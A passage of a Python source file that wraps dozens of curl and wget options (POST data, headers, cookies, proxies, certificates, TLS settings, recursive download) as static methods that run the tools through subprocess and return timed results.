            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def insecure(url: str) -> CommandResult:
        """Insecure mode (skip SSL)"""
        start_time = time.time()
        try:
            cmd = ['curl', '-sk', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def data(url: str, data: str) -> CommandResult:
        """POST data"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-d', data, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def data_binary(url: str, file_path: str) -> CommandResult:
        """POST binary data"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--data-binary', f'@{file_path}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def data_urlencode(url: str, data: str) -> CommandResult:
        """URL encode data"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--data-urlencode', data, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def form(url: str, field: str, value: str) -> CommandResult:
        """Form data"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-F', f'{field}={value}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def header(url: str, header: str) -> CommandResult:
        """Custom header"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-H', header, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def user_agent(url: str, user_agent: str) -> CommandResult:
        """Custom user agent"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-A', user_agent, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def referer(url: str, referer: str) -> CommandResult:
        """Set referer"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-e', referer, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def user(url: str, user_pass: str) -> CommandResult:
        """Basic auth"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-u', user_pass, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def cookie(url: str, cookie: str) -> CommandResult:
        """Send cookie"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-b', cookie, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def cookie_jar(url: str, cookie_file: str) -> CommandResult:
        """Save cookies"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-c', cookie_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def proxy(url: str, proxy: str) -> CommandResult:
        """Use proxy"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-x', proxy, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def cert(url: str, cert_file: str) -> CommandResult:
        """Client certificate"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-E', cert_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def key(url: str, key_file: str) -> CommandResult:
        """Private key"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--key', key_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def cacert(url: str, ca_file: str) -> CommandResult:
        """CA certificate"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--cacert', ca_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def tlsv1_2(url: str) -> CommandResult:
        """TLS 1.2"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--tlsv1.2', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def tlsv1_3(url: str) -> CommandResult:
        """TLS 1.3"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--tlsv1.3', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def continue_at(url: str) -> CommandResult:
        """Resume download"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-C', '-', '-O', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def range(url: str, range_spec: str) -> CommandResult:
        """Range request"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-r', range_spec, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def limit_rate(url: str, rate: str) -> CommandResult:
        """Limit transfer rate"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--limit-rate', rate, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def max_time(url: str, seconds: int) -> CommandResult:
        """Max time"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-m', str(seconds), url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=seconds + 5)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def connect_timeout(url: str, seconds: int) -> CommandResult:
        """Connect timeout"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--connect-timeout', str(seconds), url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=seconds + 5)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def retry(url: str, count: int) -> CommandResult:
        """Retry count"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--retry', str(count), url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def ipv4(url: str) -> CommandResult:
        """Force IPv4"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-4', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def ipv6(url: str) -> CommandResult:
        """Force IPv6"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-6', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def interface(url: str, interface: str) -> CommandResult:
        """Use interface"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--interface', interface, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def http2(url: str) -> CommandResult:
        """HTTP/2"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--http2', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def compressed(url: str) -> CommandResult:
        """Compressed response"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--compressed', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def write_out(url: str, format_str: str) -> CommandResult:
        """Write out format"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-w', format_str, '-o', '/dev/null', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dump_header(url: str, header_file: str) -> CommandResult:
        """Dump headers to file"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-D', header_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def trace(url: str, trace_file: str) -> CommandResult:
        """Trace to file"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--trace', trace_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def json(url: str, json_data: str) -> CommandResult:
        """JSON POST"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-H', 'Content-Type: application/json', '-d', json_data, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def help() -> CommandResult:
        """Curl help"""
        start_time = time.time()
        try:
            cmd = ['curl', '--help']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(True, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def version() -> CommandResult:
        """Curl version"""
        start_time = time.time()
        try:
            cmd = ['curl', '--version']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(True, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def parallel(url1: str, url2: str) -> CommandResult:
        """Parallel requests"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-Z', url1, url2]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def config(config_file: str) -> CommandResult:
        """Use config file"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-K', config_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def next(url1: str, url2: str) -> CommandResult:
        """Multiple URLs"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', url1, '--next', url2]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def styled_output(url: str) -> CommandResult:
        """Styled output"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '--styled-output', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def progress_bar(url: str) -> CommandResult:
        """Progress bar"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s', '-#', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))

# =====================
# WGET COMMANDS (50+)
# =====================
class WgetCommands:
    """All wget command variants"""
    
    @staticmethod
    def basic(url: str) -> CommandResult:
        """Basic download"""
        return NetworkTools.wget(url)
    
    @staticmethod
    def output(url: str, output_file: str) -> CommandResult:
        """Download to specific file"""
        return NetworkTools.wget(url, output_file)
    
    @staticmethod
    def continue_download(url: str) -> CommandResult:
        """Resume download"""
        start_time = time.time()
        try:
            cmd = ['wget', '-c', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def background(url: str) -> CommandResult:
        """Background download"""
        start_time = time.time()
        try:
            cmd = ['wget', '-b', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def quiet(url: str) -> CommandResult:
        """Quiet download"""
        start_time = time.time()
        try:
            cmd = ['wget', '-q', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def recursive(url: str) -> CommandResult:
        """Recursive download"""
        start_time = time.time()
        try:
            cmd = ['wget', '-r', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def mirror(url: str) -> CommandResult:
        """Mirror website"""
        start_time = time.time()
        try:
            cmd = ['wget', '-m', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def spider(url: str) -> CommandResult:
        """Spider website"""
        start_time = time.time()
        try:
            cmd = ['wget', '--spider', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def input_file(file_path: str) -> CommandResult:
        """Download from file"""
        start_time = time.time()
        try:
            cmd = ['wget', '-i', file_path]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def header(url: str, header: str) -> CommandResult:
        """Custom header"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--header={header}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def user_agent(url: str, user_agent: str) -> CommandResult:
        """Custom user agent"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--user-agent={user_agent}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def referer(url: str, referer: str) -> CommandResult:
        """Set referer"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--referer={referer}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def cookies(url: str, cookie_file: str) -> CommandResult:
        """Load cookies"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--load-cookies={cookie_file}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def save_cookies(url: str, cookie_file: str) -> CommandResult:
        """Save cookies"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--save-cookies={cookie_file}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def limit_rate(url: str, rate: str) -> CommandResult:
        """Limit download rate"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--limit-rate={rate}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def timeout(url: str, seconds: int) -> CommandResult:
        """Set timeout"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--timeout={seconds}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=seconds + 30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def tries(url: str, count: int) -> CommandResult:
        """Set retries"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--tries={count}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def retry_connrefused(url: str) -> CommandResult:
        """Retry on connection refused"""
        start_time = time.time()
        try:
            cmd = ['wget', '--retry-connrefused', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_check_cert(url: str) -> CommandResult:
        """Skip certificate check"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-check-certificate', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def certificate(url: str, cert_file: str) -> CommandResult:
        """Use client certificate"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--certificate={cert_file}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def private_key(url: str, key_file: str) -> CommandResult:
        """Use private key"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--private-key={key_file}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def ca_certificate(url: str, ca_file: str) -> CommandResult:
        """Use CA certificate"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--ca-certificate={ca_file}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def proxy(url: str, proxy: str) -> CommandResult:
        """Use proxy"""
        start_time = time.time()
        try:
            cmd = ['wget', '-e', 'use_proxy=yes', '-e', f'http_proxy={proxy}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_proxy(url: str) -> CommandResult:
        """No proxy"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-proxy', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def user(url: str, username: str) -> CommandResult:
        """HTTP user"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--user={username}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def password(url: str, password: str) -> CommandResult:
        """HTTP password"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--password={password}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def post_data(url: str, data: str) -> CommandResult:
        """POST data"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--post-data={data}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def post_file(url: str, file_path: str) -> CommandResult:
        """POST from file"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--post-file={file_path}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def method(url: str, method: str) -> CommandResult:
        """Custom HTTP method"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--method={method}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def timestamping(url: str) -> CommandResult:
        """Timestamping"""
        start_time = time.time()
        try:
            cmd = ['wget', '-N', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_clobber(url: str) -> CommandResult:
        """No clobber"""
        start_time = time.time()
        try:
            cmd = ['wget', '-nc', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def delete_after(url: str) -> CommandResult:
        """Delete after download"""
        start_time = time.time()
        try:
            cmd = ['wget', '--delete-after', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def progress(url: str) -> CommandResult:
        """Show progress bar"""
        start_time = time.time()
        try:
            cmd = ['wget', '--progress=bar', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def show_progress(url: str) -> CommandResult:
        """Show progress"""
        start_time = time.time()
        try:
            cmd = ['wget', '--show-progress', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def config(config_file: str) -> CommandResult:
        """Use config file"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--config={config_file}']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def append_output(url: str, log_file: str) -> CommandResult:
        """Append to log"""
        start_time = time.time()
        try:
            cmd = ['wget', '-a', log_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def output_file(url: str, log_file: str) -> CommandResult:
        """Output to log file"""
        start_time = time.time()
        try:
            cmd = ['wget', '-o', log_file, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_parent(url: str) -> CommandResult:
        """No parent directories"""
        start_time = time.time()
        try:
            cmd = ['wget', '-np', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def cut_dirs(url: str, count: int) -> CommandResult:
        """Cut directory levels"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--cut-dirs={count}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def directory_prefix(url: str, directory: str) -> CommandResult:
        """Set directory prefix"""
        start_time = time.time()
        try:
            cmd = ['wget', '-P', directory, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def convert_links(url: str) -> CommandResult:
        """Convert links"""
        start_time = time.time()
        try:
            cmd = ['wget', '-k', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
